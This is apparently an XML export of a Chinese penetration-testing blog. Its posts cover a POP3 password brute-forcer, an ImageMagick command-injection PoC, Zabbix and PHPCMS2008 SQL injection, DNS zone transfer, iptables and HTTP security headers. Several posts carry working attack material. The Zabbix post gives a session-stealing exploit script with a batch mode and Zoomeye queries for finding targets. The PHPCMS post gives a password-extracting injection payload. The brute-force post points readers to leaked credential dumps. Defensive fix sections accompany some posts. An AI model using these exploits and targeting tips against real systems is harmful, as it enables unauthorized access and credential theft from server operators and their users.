pop.quit() print "获取信息失败!" continue ret = (user,value,pop.stat()[0],pop.stat()[1]) success.append(ret) pop.quit() break except: #print "An error occurred:", msg passprint "\t --------------------------------------------------\n"print "[+] Server:",serverprint "[+] Port: 995"print "[+] Users Loaded:",len(users)print "[+] Words Loaded:",len(words)print "[+] Server response:",welcome,"\n"mailbruteforce(users,words)print "\t[+] have weakpass :\t",len(success)if len(success) &gt;=1: for ret in success: print "\n\n[+] Login successful:",ret[0], ret[1] print "\t[+] Mail:",ret[2],"emails" print "\t[+] Size:",ret[3],"bytes\n"print "\n[-] Done" 测试结果： 说明：用户字典文件需要@domain.com，类似zhangsan@domain.com、lisi@domain.com、wangwu@domain.com这样的。由于我也没有企业邮箱的账号密码，也就没测试成功的，要是感兴趣，可以搜一下相关社工裤。 附： python 中 os._exit()， sys.exit()， exit() 的区别是什么？ sys.exit(n) 退出程序引发一个SystemExit异常, 可以捕获异常执行些清理工作. n默认值为0, 表示正常退出. 其他都是非正常退出. 没有捕获这个异常，会直接退出；捕获这个异常可以做一些额外的清理工作。 一般主程序中使用此退出 os._exit(n), 直接退出 Python 解释器，其后的代码都不执行, 不抛异常, 不执行相关清理工作. 常用在子进程的退出. exit() 跟 C 语言等其他语言的 exit() 应该是一样的 pop3收取邮件的过程一般是: 连接pop3服务器 (poplib.POP3.__init__) 发送用户名和密码进行验证 (poplib.POP3.user poplib.POP3.pass_) 获取邮箱中信件信息 (poplib.POP3.stat) 收取邮件 (poplib.POP3.retr) 删除邮件 (poplib.POP3.dele) 退出 (poplib.POP3.quit) 1234567891011121314命令 poplib方法 参数 状态 描述-----------------------------------------------------------------------------------------------USER user username 认可 用户名，此命令与下面的pass命令若成功，将导致状态转换PASS pass_ password 认可 用户密码 APOP apop Name,Digest 认可 Digest是MD5消息摘要-----------------------------------------------------------------------------------------------STAT stat None 处理 请求服务器发回关于邮箱的统计资料，如邮件总数和总字节数UIDL uidl [Msg#] 处理 返回邮件的唯一标识符，POP3会话的每个标识符都将是唯一的LIST list [Msg#] 处理 返回邮件数量和每个邮件的大小RETR retr [Msg#] 处理 返回由参数标识的邮件的全部文本DELE dele [Msg#] 处理 服务器将由参数标识的邮件标记为删除，由quit命令执行RSET rset None 处理 服务器将重置所有标记为删除的邮件，用于撤消DELE命令TOP top [Msg#] 处理 服务器将返回由参数标识的邮件前n行内容，n必须是正整数NOOP noop None 处理 服务器返回一个肯定的响应]]></content>
      <tags>
        <tag>爆破</tag>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ImageMagick命令执行漏洞浅析]]></title>
    <url>%2F2016%2F10%2F02%2FImageMagick%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 前言什么是ImageMagick？ImageMagick是一个功能强大的开源图形处理软件,可以用来读、写和处理超过90种的图片文件,包括流行的JPEG、GIF、 PNG、PDF以及PhotoCD等格式。使用它可以对图片进行切割、旋转、组合等多种特效的处理。由于其功能强大、性能较好,并且对很多语言都有拓展支持,所以在程序开发中被广泛使用。许多网站开发者喜爱使用ImageMagick拓展来做web上的图片处理工作,比如用户头像生成、图片编辑等。 0x01 漏洞描述ImageMagick是一款开源图片处理库，支持PHP、Ruby、NodeJS和Python等多种语言，使用非常广泛。包括PHP imagick、Ruby rmagick和paperclip以及NodeJS imagemagick等多个图片处理插件都依赖它运行。当攻击者构造含有恶意代码得图片时，ImageMagick库对于HTTPPS文件处理不当，没有做任何过滤，可远程实现远程命令执行，进而可能控制服务器。 0x02 影响程度攻击成本：低 危害程度：高 影响范围：ImageMagick 6.9.3-9以前的所有版本 0x03 漏洞分析命令执行漏洞是出在ImageMagick对https形式的文件处理的过程中。 ImageMagick之所以支持那么多的文件格式,是因为它内置了非常多的图像处理库,对于这些图像处理库,ImageMagick给它起了个名字叫做”Delegate”(委托),每个Delegate对应一种格式的文件,然后通过系统的system()命令来调用外部的lib进行处理。调用外部lib的过程是使用系统的system命令来执行的，导致命令执行的代码。 ImageMagick委托的默认配置文件： /etc/ImageMagick/delegates.xml 具体代码请参考：Github-ImageMagick 我们定位到https委托得那一行：1" &lt;delegate decode=\"https\" command=\"&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\"/&gt;" 可以看到，command定义了它对于https文件处理时带入system()函数得命令：&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;。 wget是从网络下载文件得命令，%M是一个占位符，它得具体定义在配置文件中如下：123456789101112131415161718%i input image filename %o output image filename %u unique temporary filename %Z unique temporary filename %# input image signature %b image file size %c input image comment %g image geometry %h image rows (height) %k input image number colors %l image label %m input image format %p page number %q input image depth %s scene number %w image columns (width) %x input image x resolution %y input image y resolution 可以看到%m被定义为输入的图片格式,也就是我们输入的url地址。但是由于只是做了简单的字符串拼接,没有做任何过滤，直接拼接到command命令中，所以我们可以将引号闭合后通过&quot;|&quot;,”`”,”&amp;”等带入其他命令,也就形成了命令注入。 比如我们传入如下代码： https://test.com&quot;|ls “-al 则实际得system函数执行得命令为： “wget” -q -O “%o” “ https://test.com&quot;|ls “-al” 这样，ls -al命令成功执行。 0x04 漏洞利用这个漏洞得poc由老外给出得，如下：1234push graphic-contextviewbox 0 0 640 480fill 'url(https://"|id; ")'pop graphic-context push和pop是用于堆栈的操作，一个进栈，一个出栈; viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面; fill url()是把图片填充到当前元素内; 在其中我们使用了fill url()的形式调用存在漏洞的https delegate,当ImageMagick去处理这个文件时,漏洞就会被触发。 附：ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，允许在其中加载ImageMagick中其他的delegate(比如存在漏洞的https delegate)。并且在图形处理的过程中,ImageMagick会自动根据其内容进行处理,也就是说我们可以将文件随意定义为png、jpg等网站上传允许的格式,这大大增加了漏洞的可利用场景。 利用过程： 创建一个exploit.png文件，包含以下内容： 1234push graphic-contextviewbox 0 0 640 480fill 'url(https://test.com/image.jpg"|ls "-al)'pop graphic-context 执行命令：convert exploit.png 1.png(后面的是convert的参数) 0x05 漏洞修复 升级到最新版本 配置/etc/ImageMagick/policy.xml的方式来禁止https、mvg这些delegate,或者直接在配置文件删除相应的delegate 1234567&lt;policymap&gt; &lt;policy domain="coder" rights="none" pattern="EPHEMERAL" /&gt; &lt;policy domain="coder" rights="none" pattern="URL" /&gt; &lt;policy domain="coder" rights="none" pattern="HTTPS" /&gt; &lt;policy domain="coder" rights="none" pattern="MVG" /&gt; &lt;policy domain="coder" rights="none" pattern="MSL" /&gt;&lt;/policymap&gt;]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zabbix SQL注入,绕过登陆]]></title>
    <url>%2F2016%2F09%2F23%2FZabbix-SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87%E7%99%BB%E9%99%86%2F</url>
    <content type="text"><![CDATA[0x00 漏洞概述Zabbix是一个开源的企业级性能监控解决方案。zabbix的jsrpc的profileIdx2参数存在insert方式的SQL注入漏洞，攻击者无需授权登陆即可登陆zabbix管理系统，也可通过script等功能轻易直接获取zabbix服务器的操作系统权限。 但是无需登录注入这里有个前提，就是zabbix开启了guest权限。而在zabbix中，guest的默认密码为空。需要有这个条件的支持才可以进行无权限注入。 0x01 影响程度攻击成本：低 危害程度：高 是否登陆：不需要 影响范围：2.2.x, 3.0.0-3.0.3。（摘自Freebuf） 0x02 漏洞测试在Zabbix中有两个文件存在SQL注入漏洞，分别是jsrpc.php和latest.php，存在漏洞参数分别为：profileIdx2和toggle_ids。 在目标的zabbix的地址后面加上如下POC： 123456/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2'666&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1 若返回页面出现You have an error in your SQL syntax则证明存在SQL注入漏洞。 漏洞EXP：123456789101112131415161718192021222324252627282930#!/usr/bin/python# -*- coding: UTF-8 -*-'''@Author：w2n1ck@博客：http://byd.dropsec.xyz/'''import urllib,sys,urllib2,urllibdef cookie(url): poc='/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=(select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y)&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=' body= urllib.urlopen(url+poc).read() cookie=body.split('Duplicate entry')[1].split('for key')[0][3:-2] return cookiedef test(cookie,url): url=url+'proxies.php' req=urllib2.Request(url) cook="zbx_sessionid=%s" % cookie req.add_header('Cookie', cook) response=urllib2.urlopen(req) data=response.read() if data.find('Access denied.') &lt; 0: print "OK--&gt;",cookie else: print 'ERROR'if len(sys.argv)==4: for i in open(sys.argv[3]).readlines(): print i test(cookie(i),i)else: print sys.argv[1] test(cookie(sys.argv[1]),sys.argv[1]) 设计步骤：首先查询的sql语句为：select 1 from (select count(*),concat(floor(rand(0)*2), (select sessionid from sessions where userid=1 and status=0 limit 1))x from information_schema.character_sets group by x)y 查询的sessionid会在页面中显示 然后通过body.split(&#39;Duplicate entry&#39;)[1].split(&#39;for key&#39;)[0][3:-2]来取出sessionid的值,具体的可以看响应的页面结构 然后带入cookie访问proxies.php，如果没有出现Access denied. 则说明进入成功，输出sessionid的值 参考:独自等待博客EXP 0x03 漏洞修复1、禁用后台用户guest账号（注入要求此账号启用）。 2、升级到zabbix的最新版。 0x04 批量查找上Zoomeye，输入查询关键字:Zabbix port:80，当然，如果你想定点查询的话还可以加上country: City:等字段，比如查询北京Zabbix country:china port:80 city:Beijing;]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>自动化</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPCMS2008广告模板SQL注入漏洞]]></title>
    <url>%2F2016%2F09%2F22%2FPHPCMS2008%E5%B9%BF%E5%91%8A%E6%A8%A1%E6%9D%BFSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x00 漏洞描述PHPCMS2008由于广告模块取referer不严，导致一处sql注入漏洞.可以得到管理员用户名与密码，攻击者登录后台后可能会获取webshell，对服务器进行进一步的渗透。 0x01 漏洞分析漏洞产生的位置：/ads/include/ads_place.class.php的show方法中. 123456789101112function show($placeid) ... if($adses[0]['option']) &#123; foreach($adses as $ads) &#123; $contents[] = ads_content($ads, 1); $this-&gt;db-&gt;query(“INSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (‘$ads[adsid]’,’$_username’,’$ip’,‘$this-&gt;referrer’,‘$time’,,’0’)”); $template = $ads['template'] ? $ads['template'] : 'ads'; &#125; &#125; ... sql语句中 1$this-&gt;db-&gt;query(“INSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (‘$ads[adsid]’,’$_username’,’$ip’,‘$this-&gt;referrer’,‘$time’,,’0’)”); 这里$this-&gt;referrer通过this方法直接将HTTP请求头中的referer字段插入到数据库中,没有做任何过滤措施。(这个this方法是PHPCMS里面直接封装的)。 所以现在已经找到漏洞点，下一步就是找包含漏洞的用户可控的页面。如果漏洞是用户不可控的，比如只能管理员利用，那就相当的鸡肋了。 这里使用回溯的方法，看看哪些页面调用了它。 页面/ads/include/commom.inc.php 123456&lt;?php ...require MOD_ROOT.'include/ads_place.class.php';require MOD_ROOT.'include/ads.class.php';...?&gt; 在往上看看谁调用了/ads/include/commom.inc.php /ads/ad.php文件中 12345&lt;?php...require './include/common.inc.php';...?&gt; ad.php文件为用户可控文件，但ad.php有时不能访问，继续向上查找/data/js.php 1234&lt;?phpchdir(‘../ads/’);require ‘./ad.php’;?&gt; 在用户访问首页时，会调用js.php，通过该文件可以提交有害字段，然后通过逐层调用，传入字段referer到危险方法show，引入SQL注入攻击。 0x02 漏洞利用修改请求头中的referer字段的话有很多种，比如burpsuite，Tamper Data… 这里直接使用火狐的Tamper Data进行修改： 点击Start Tamper,然后访问http://your-addr/data/js.php?id=1 这时候Tamper Data会跳出来,在右边框内，点击右键，添加一个element值填写payload referer=1’, (SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), ‘0’)# 这里我解释一下：因为漏洞的sql语句是INSERT是不回显的，所以可以使用盲注，这里的payload使用的floor报错注入。floor报错注入原理请参考：floor函数用法 把这个payload带入sql语句中是： 1$this-&gt;db-&gt;query(“INSERT INTO$this-&gt;stat_table(`adsid`,`username`,`ip`,`referer`,`clicktime`,`type`)VALUES (‘$ads[adsid]’,’$_username’,’$ip’,‘1’,‘$time’,(SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),char(45,45,45),(SELECT password from phpcms_member limit 1))a from information_schema.tables group by a)b), ‘0’)#,’0’)”); 0x03 漏洞修复对相关字段进行过滤处理。 123$referer = safe_replace($this-&gt;referer); $this-&gt;db-&gt;query("INSERT INTO $this-&gt;stat_table (`adsid`, `username`, `ip`, `referer`, `clicktime`, `type`) VALUES ('$ads[adsid]', '$_username', '$ip', '$referer', '$time', '0')");$template = $ads['template'] ? $ads['template'] : 'ads'; 这里safe_replace是PHPCMS2008封装的过滤函数。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>SQL注入</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python实现批量网站存活检测]]></title>
    <url>%2F2016%2F09%2F21%2FPython%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E7%BD%91%E7%AB%99%E5%AD%98%E6%B4%BB%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[做渗透测试的时候，有个比较大的项目，里面有几百个网站，这样你必须首先确定哪些网站是正常，哪些网站是不正常的。所以自己就编了一个小脚本，为以后方便使用。 具体实现的代码如下： 12345678910111213141516171819202122232425262728#!/usr/bin/python# -*- coding: UTF-8 -*-'''@Author：w2n1ck@博客：http://byd.dropsec.xyz/'''import requestsimport sysf = open('url.txt', 'r')url = f.readlines()length = len(url)url_result_success=[]url_result_failed=[]for i in range(0,length): try: response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5) if response.status_code != 200: raise requests.RequestException(u"Status code error: &#123;&#125;".format(response.status_code)) except requests.RequestException as e: url_result_failed.append(url[i]) continue url_result_success.append(url[i])f.close()result_len = len(url_result_success)for i in range(0,result_len): print '网址%s' % url_result_success[i].strip()+'打开成功' 测试结果如下： 遇到的问题： 刚开始测试的时候，遇到只要是不能错误，或者不存在的，直接报错停止程序。后来发现是因为response.status_code != 200这里取状态码的时候错误。 因为有的网站不能打开的话，不会返回状态码。所以程序就不知道！==200怎么处理了。 解决方法： 使用try except else捕捉异常 具体代码为： 1234567try: response = requests.get(url[i].strip(), verify=False, allow_redirects=True, timeout=5) if response.status_code != 200: raise requests.RequestException(u"Status code error: &#123;&#125;".format(response.status_code)) except requests.RequestException as e: url_result_failed.append(url[i]) continue]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS域传送漏洞]]></title>
    <url>%2F2016%2F09%2F20%2FDNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[DNS是网络中应用非常广泛的服务之一，是一种底层的网络基础服务。它的主要作用是提供域名（如baidu.com）和IP直接解析关系的功能，只要我们的网络通信中存在域名，就会涉及到DNS服务。DNS区域传送（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。一般来说，DNS区域传送操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传送（zone transfer）操作是后果最为严重的错误配置之一。 简单点说就是DNS服务器配置不当，导致可以将该DNS服务器上的数据传送到其他的主机上。恶意攻击者可以通过此种方法，获取某个域名的所有子域名及对应IP地址。 测试方法1、Linux dig测试方法dig是Linux上常用的dns工具，如果没有此命令，可以使用如下命令安装（Centos系统）： yum install bind-utils 使用dig进行DNS域传送，首先要找到主机的SOA或者NS记录： 12345678910111213141516171819[root@user ~]# dig soa xxx.com ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; soa 3mc2.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 2865;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION:;3mc2.com. IN SOA ;; ANSWER SECTION:xxx.com. 600 IN SOA f1g1ns1.dnspod.net. freednsadmin.dnspod.com. 1411491105 3600 180 1209600 180 ;; Query time: 504 msec;; SERVER: 223.5.5.5#53(223.5.5.5);; WHEN: Wed Mar 11 11:26:05 2015;; MSG SIZE rcvd: 100 显示结果忽略注释部分，我们可以看到SOA记录有两个服务器：f1g1ns1.dnspod.net 和 freednsadmin.dnspod.com，然后我们就可以通过如下命令查看DNS是否存在DNS域传送漏洞，如果存在，则可以找到xxx.com的所有子域名和IP对应关系： 12345[root@user ~]# dig axfr xxx.com @f1g1ns1.dnspod.net ; &lt;&lt;&gt;&gt; DiG 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 &lt;&lt;&gt;&gt; axfr xxx.com @f1g1ns1.dnspod.net;; global options: +cmd; Transfer failed. 以上是不能进行DNS域传送的结果，下图是可以进行DNS域传送的结果： 2、Windows nslookup命令nslookup是windows下自带的DNS测试工具，可以通过此命令进行DNS域传送测试： 主要方法和dig类似，先找出ns服务器，然后执行ls -d 列出子域等信息（以下是不能传送的情形）： 123456789101112131415161718192021222324[c:\~]$ nslookup默认服务器: public1.alidns.comAddress: 223.5.5.5 &gt; set type=ns&gt; xxx.com非权威应答:服务器: public1.alidns.comAddress: 223.5.5.5 xxx.com nameserver = f1g1ns1.dnspod.netxxx.com nameserver = f1g1ns2.dnspod.net&gt; server f1g1ns2.dnspod.net默认服务器: f1g1ns2.dnspod.netAddresses: 115.236.137.40 112.90.82.194 101.226.30.224 182.140.167.188&gt; set type=any&gt; ls -d 3mc2.com*** 无法列出域 xxx.com: BAD ERROR VALUEDNS 服务器拒绝将区域 3mc2.com 传送到您的计算机。如果这不正确，请检查 IP 地址 223.5.5.5 的 DNS 服务器上 3mc2.com 的区域传送安全设置。 正常存在DNS域传送漏洞的返回结果如下所示： 3、使用dnsenum.pl和Dnswalk测试：现成工具，不做介绍，Kali里边有]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
        <tag>DNS域传送</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPtables入门教程]]></title>
    <url>%2F2016%2F09%2F03%2FIPtables%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[0x00 iptables介绍防火墙，其实说白了讲，就是用于实现Linux下访问控制的功能的，它分为硬件的或者软件的防火墙两种。无论是在哪个网络中，防火墙工作的地方一定是在网络的边缘。而我们的任务就是需要去定义到底防火墙如何工作，这就是防火墙的策略，规则，以达到让它对出入网络的IP、数据进行检测。 linux的包过滤功能，即linux防火墙，它由netfilter 和 iptables 两个组件组成。 netfilter 组件也称为内核空间，是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集。 iptables 组件是一种工具，也称为用户空间，它使插入、修改和除去信息包过滤表中的规则变得容易。 0x01 iptables的结构iptables的结构： iptables -&gt; Tables -&gt; Chains -&gt; Rules简单地讲，tables由chains组成，而chains又由rules组成。iptables 默认有四个表Filter, NAT, Mangle, Raw，其对于的链如下图 0x02 filter表详解1. 在iptables中，filter表起过滤数据包的功能，它具有以下三种内建链： INPUT链 – 处理来自外部的数据。 OUTPUT链 – 处理向外发送的数据。 FORWARD链 – 将数据转发到本机的其他网卡设备上。 2. 数据流向场景 访问本机：在INPUT链上做过滤 本机访问外部：在OUTPUT链上做过滤 通过本机访问其他主机:在FORWARD链上做过滤 3. Iptables基本操作 启动iptables：service iptables start 关闭iptables：service iptables stop 重启iptables：service iptables restart 查看iptables状态：service iptables status 保存iptables配置：service iptables save Iptables服务配置文件：/etc/sysconfig/iptables-config Iptables规则保存文件：/etc/sysconfig/iptables 打开iptables转发：echo “1”&gt; /proc/sys/net/ipv4/ip_forward 0x03 iptables命令参考命令： iptables [ -t 表名] 命令选项 [链名] [条件匹配] [-j 目标动作或跳转] 1. 表名 表名：Filter, NAT, Mangle, Raw 起包过滤功能的为表Filter，可以不填，不填默认为Filter 2. 命令选项 选项名 功能及特点 -A 在指定链的末尾添加（–append）一条新的规则 -D 删除（–delete）指定链中的某一条规则，按规则序号或内容确定要删除的规则 -I 在指定链中插入（–insert）一条新的规则，默认在链的开头插入 -R 修改、替换（–replace）指定链中的一条规则，按规则序号或内容确定 -L 列出（–list）指定链中的所有的规则进行查看，默认列出表中所有链的内容 -F 清空（–flush）指定链中的所有规则，默认清空表中所有链的内容 -N 新建（–new-chain）一条用户自己定义的规则链 -X 删除指定表中用户自定义的规则链（–delete-chain） -P 设置指定链的默认策略（–policy） -n 用数字形式（–numeric）显示输出结果，若显示主机的 IP地址而不是主机名 -P 设置指定链的默认策略（–policy） -v 查看规则列表时显示详细（–verbose）的信息 -V 查看iptables命令工具的版本（–Version）信息 -h 查看命令帮助信息（–help） –line-number 查看规则列表时，同时显示规则在链中的顺序号 3. 链名 可以根据数据流向来确定具体使用哪个链，在Filter中的使用情况如下： INPUT链 – 处理来自外部的数据。 OUTPUT链 – 处理向外发送的数据。 FORWARD链 – 将数据转发到本机的其他网卡设备上。 4. 条件匹配 条件匹配分为基本匹配和扩展匹配，扩展匹配又分为隐式扩展和显示扩展。 a)基本匹配包括： 匹配参数 说明 -p 指定规则协议，如tcp, udp,icmp等，可以使用all来指定所有协议 -s 指定数据包的源地址参数，可以使IP地址、网络地址、主机名 -d 指定目的地址 -i 输入接口 -o 输出接口 b)隐式扩展包括： c)常用显式扩展 5. 目标值 数据包控制方式包括四种为： ACCEPT：允许数据包通过。 DROP：直接丢弃数据包，不给出任何回应信息。 REJECT：拒绝数据包通过，必须时会给数据发送端一个响应信息。 LOG：在/var/log/messages 文件中记录日志信息，然后将数据包传递给下一条规则。 QUEUE：防火墙将数据包移交到用户空间 RETURN：防火墙停止执行当前链中的后续Rules，并返回到调用链(the calling chain) 0x04 Iptables常见命令 删除iptables现有规则 iptables –F 查看iptables规则 iptables –L（iptables –L –v -n） 增加一条规则到最后 iptables -A INPUT -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT 添加一条规则到指定位置 iptables -I INPUT 2 -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT 删除一条规则 iptabels -D INPUT 2 修改一条规则 iptables -R INPUT 3 -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT 设置默认策略 iptables -P INPUT DROP 允许远程主机进行SSH连接 iptables -A INPUT -i eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT 允许本地主机进行SSH连接 iptables -A OUTPUT -o eth0 -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT iptables -A INTPUT -i eth0 -p tcp –sport 22 -m state –state ESTABLISHED -j ACCEPT 允许HTTP请求 iptables -A INPUT -i eth0 -p tcp –dport 80 -m state –state NEW,ESTABLISHED -j ACCEPT iptables -A OUTPUT -o eth0 -p tcp –sport 80 -m state –state ESTABLISHED -j ACCEPT 限制ping 192.168.146.3主机的数据包数，平均2/s个，最多不能超过3个 iptables -A INPUT -i eth0 -d 192.168.146.3 -p icmp –icmp-type 8 -m limit –limit 2/second –limit-burst 3 -j ACCEPT 限制SSH连接速率(默认策略是DROP) iptables -I INPUT 1 -p tcp –dport 22 -d 192.168.146.3 -m state –state ESTABLISHED -j ACCEPT iptables -I INPUT 2 -p tcp –dport 22 -d 192.168.146.3 -m limit –limit 2/minute –limit-burst 2 -m state –state NEW -j ACCEPT 0x05 使用iptables抵抗常见攻击1.防止syn攻击 思路一：限制syn的请求速度（这个方式需要调节一个合理的速度值，不然会影响正常用户的请求） iptables -N syn-flood iptables -A INPUT -p tcp --syn -j syn-flood iptables -A syn-flood -m limit --limit 1/s --limit-burst 4 -j RETURN iptables -A syn-flood -j DROP 思路二：限制单个ip的最大syn连接数 iptables –A INPUT –i eth0 –p tcp --syn -m connlimit --connlimit-above 15 -j DROP 2. 防止DOS攻击 利用recent模块抵御DOS攻击 iptables -I INPUT -p tcp -dport 22 -m connlimit --connlimit-above 3 -j DROP 单个IP最多连接3个会话 iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH 只要是新的连接请求，就把它加入到SSH列表中 Iptables -I INPUT -p tcp --dport 22 -m state NEW -m recent --update --seconds 300 --hitcount 3 --name SSH -j DROP 5分钟内你的尝试次数达到3次，就拒绝提供SSH列表中的这个IP服务。被限制5分钟后即可恢复访问。 3. 防止单个ip访问量过大 iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j DROP 4. 木马反弹 iptables –A OUTPUT –m state --state NEW –j DROP 5. 防止ping攻击 iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/m -j ACCEPT 参考资料：乌云-iptables基础知识]]></content>
      <tags>
        <tag>运维</tag>
        <tag>iptables</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP header 安全配置]]></title>
    <url>%2F2016%2F09%2F02%2Fheader%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[现代浏览器提供了一些安全相关的响应头，使用这些响应头一般只需要修改服务器配置即可，不需要修改程序代码，成本很低。 安全方面的 HTTP Header 防御 XSS (Cross Site Scripting)： Content-Security-Policy Set-Cookie: HttpOnly X-XSS-Protection X-Download-Options Nginx在nginx.conf的server段中加入： add_header X-XSS-Protection “1; mode=block”; 在Nginx.conf的server段加入： add_header Content-Security-Policy: script-src &#039;self&#039; https://apis.google.com 防御 Clickjacking： X-Frame-Options add_header X-Frame-Options: DENY Nginx中编辑nginx.conf ，在server段加入： add_header X-Frame-Options “SAMEORIGIN”; 强化 HTTPS机制： Set-Cookie: Secure Strict-Transport-Security 在Nginx.conf的server段加入： add_header Strict-Transport-Security “max-age=31536000; includeSubdomains;”; 避免浏览器误判文件形式： X-Content-Type-Options 在Nginx.conf的server段加入： add_header X-Content-Type-Options nosniff; 保证网站资源被任意存取： Access-Control-Allow-Origin（此 header 若設定錯誤會適得其反！） X-Permitted-Cross-Domain-Policies add_header ccess-Control-Allow-Origin: http://foo.exampleAccess-Control-Allow-Origin: * Cookie保护 HttpOnly，会阻止XSS攻击将你的用户cookie发给黑客 Secure,属性能让Cookie通过HTTPS连接，而不是HTTP，这样，能够访问你的网络的黑客无法读取未加密的Cookie。 add_header Set-Cookie: HttpOnly add_header Set-Cookie: Secure]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从DVWA中学习PHP常见漏洞及防御]]></title>
    <url>%2F2016%2F09%2F01%2F%E4%BB%8EDVWA%E4%B8%AD%E5%AD%A6%E4%B9%A0PHP%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1%2F</url>
